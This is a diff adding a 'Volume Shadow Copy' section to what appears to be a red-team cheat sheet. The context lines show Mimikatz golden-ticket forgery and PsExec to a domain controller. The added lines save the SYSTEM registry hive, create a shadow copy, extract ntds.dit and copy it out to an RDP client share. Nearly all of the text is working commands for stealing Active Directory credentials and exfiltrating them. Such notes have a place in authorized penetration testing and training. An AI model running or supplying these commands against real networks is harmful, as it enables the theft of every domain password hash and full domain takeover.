@@ -279,3 +279,12 @@ kerberos::golden /user:$USER /domain:$TARGET_AD /sid:$TARGET_SID /krbtgt:$HASH /
 misc::cmd
 PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
 ```
+
+Volume Shadow Copy:
+#vshadow #ntds #system-bak
+```powershell
+reg.exe save hklm\system c:\system.bak
+vshadow.exe -p -nw C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
+cp .\ntds.dit.bak \\tsclient\shared
+```
